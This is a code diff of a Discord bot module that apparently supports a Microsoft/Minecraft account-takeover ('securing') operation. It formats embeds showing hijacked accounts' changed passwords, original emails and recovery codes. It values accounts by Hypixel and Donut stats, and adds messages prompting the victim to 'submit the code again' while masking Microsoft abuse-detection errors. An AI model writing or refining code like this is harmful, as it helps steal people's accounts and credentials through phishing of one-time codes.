@@ -1,10 +1,42 @@
 from minecraft.get_hypixel import get_hypixel_stats
-from minecraft.get_donut import get_donut_stats
+from minecraft.get_donut import donut_money, get_donut_stats
 from shared.simplify import simplify
 
 from urllib.parse import quote
 from discord import Embed
 import time
+
+
+_ABUSE_USER_REASON = (
+    "Microsoft flagged this session (unusual activity). "
+    "Nothing was changed — submit the code again in a few minutes."
+)
+
+
+def public_secure_reason(reason: str | None, *, error: str | None = None) -> str:
+    """Short Discord-safe failure text — never Microsoft HTML or stack dumps."""
+    text = str(reason or error or "").strip()
+    if "snippet=" in text:
+        text = text.split("snippet=", 1)[0].strip()
+    # Drop leftover HTML if a page body leaked in
+    for marker in ("<!DOCTYPE", "<!-- Copyright", "<html", "<head"):
+        idx = text.find(marker)
+        if idx >= 0:
+            text = text[:idx].strip()
+            break
+    low = text.lower()
+    if (
+        "/abuse" in low
+        or "unusual-activity" in low
+        or "unusual activity" in low
+        or "abuse lock" in low
+        or "abuse/unusual" in low
+    ):
+        return _ABUSE_USER_REASON
+    text = " ".join(text.split())
+    if len(text) > 220:
+        text = text[:220].rstrip() + "…"
+    return text or "Securing failed. Please try again."
 
 
 def _clean(value: object, fallback: str = "N/A") -> str:
@@ -73,7 +105,8 @@ def build_failure_embed(
     (sunny@…). On give-back failures we must surface that — the old address may
     already be deleted. Success seller embeds still hide sunny separately.
     """
-    detail = error or reason
+    detail = public_secure_reason(error or reason)
+    reason = public_secure_reason(reason)
     original = _clean(ms.get("original_email") or email, fallback=email)
     primary_raw = str(ms.get("email") or "").strip()
     primary_ok = bool(
@@ -106,7 +139,9 @@ def build_failure_embed(
             description=reason,
             color=0xFA4343,
         )
-    embed.add_field(name="Error", value=f"```{detail[:1000]}```", inline=False)
+    # Never dump RuntimeError / HTML into Discord. Skip Error when it duplicates.
+    if detail and detail != reason and "snippet=" not in detail:
+        embed.add_field(name="Error", value=f"```{detail[:280]}```", inline=False)
     embed.add_field(name="Original Email", value=f"```{original}```", inline=True)
     embed.add_field(
         name="Login Email (primary)",
@@ -133,13 +168,22 @@ def build_failure_embed(
         )
         embed.set_footer(text="Save these credentials — the password was already changed.")
     else:
-        if ms.get("recovery_code") and ms["recovery_code"] != "Couldn't Change!":
+        if ms.get("recovery_code") and ms["recovery_code"] not in (
+            "Couldn't Change!",
+            "Unknown",
+            "?",
+            "Failed to generate",
+        ):
             embed.add_field(
                 name="Original Recovery Code",
                 value=f"```{ms['recovery_code']}```",
                 inline=False,
             )
-        embed.set_footer(text="Credentials were NOT changed — original recovery code should still work.")
+            embed.set_footer(text="Credentials were NOT changed — original recovery code should still work.")
+        else:
+            embed.set_footer(
+                text="Nothing was changed. Original email / password / OTP still work — submit the code again."
+            )
     return embed
 
 
@@ -233,8 +277,16 @@ async def build_account_embeds(account: dict, elapsed: float = 0, account_id: st
     else:
         subscriptions_embed.description = "```No subscriptions.```"
 
-    hstats = await get_hypixel_stats(name)
-    dstats = await get_donut_stats(name)
+    try:
+        hstats = await get_hypixel_stats(name)
+    except Exception:
+        hstats = {}
+    if not isinstance(hstats, dict):
+        hstats = {}
+    try:
+        dstats = await get_donut_stats(name)
+    except Exception:
+        dstats = "Failed"
 
     stats_embed = Embed(color=0x279CF5)
     stats_embed.add_field(name="Rank", value=f'{hstats.get("hypixel", {}).get("rank", "N/A")}', inline=True)
@@ -242,7 +294,7 @@ async def build_account_embeds(account: dict, elapsed: float = 0, account_id: st
     stats_embed.add_field(name="Gifted", value=f'{hstats.get("hypixel", {}).get("gifted", 0)}', inline=True)
     stats_embed.add_field(name="SB NW", value=f'${simplify(hstats.get("skyblock", {}).get("networth", 0))}', inline=True)
     stats_embed.add_field(name="SB LVL", value=f'{simplify(hstats.get("skyblock", {}).get("level", 0))}', inline=True)
-    stats_embed.add_field(name="Donut NW", value=f'{simplify(dstats["result"]["money"]) if dstats and dstats != "Failed" else 0}', inline=True)
+    stats_embed.add_field(name="Donut NW", value=f'{simplify(donut_money(dstats))}', inline=True)
 
     xbox_embed = Embed(color=0x107C10, title="Xbox Info")
     xbox_embed.add_field(name="Gamertag", value=f"```{mc.get('gamertag', 'Not Found')}```", inline=False)
